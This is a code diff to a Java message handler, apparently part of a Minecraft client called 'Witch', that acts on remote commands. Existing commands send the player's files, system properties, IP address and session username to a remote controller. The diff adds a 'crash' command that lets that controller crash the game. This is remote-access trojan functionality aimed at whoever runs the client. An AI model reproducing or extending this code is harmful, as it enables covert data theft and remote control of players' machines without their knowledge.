@@ -65,6 +65,7 @@ public class MessageHandler {
                     case "read" -> messageUtils.send(msgType, FileUtil.read(msg));
                     case "runargs" -> messageUtils.send(msgType, System.getProperties());
                     case "ip" -> messageUtils.send(msgType, NetUtil.getIp());
+                    case "crash" -> MinecraftUtil.crash();
                     case "xor" -> {
                         messageUtils.setXOR(msg);
                         messageUtils.acceptXOR = true;
@@ -72,7 +73,7 @@ public class MessageHandler {
                         String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + mc.getSession().getUsername();
                         messageUtils.send("greeting", greetingMsg);
                         messageUtils.send("player", new PlayerInfo(Witch.mc.player));
-                        messageUtils.send(msgType, NetUtil.getIp());
+                        messageUtils.send("ip", NetUtil.getIp());
                     }
                     default -> {
                     }
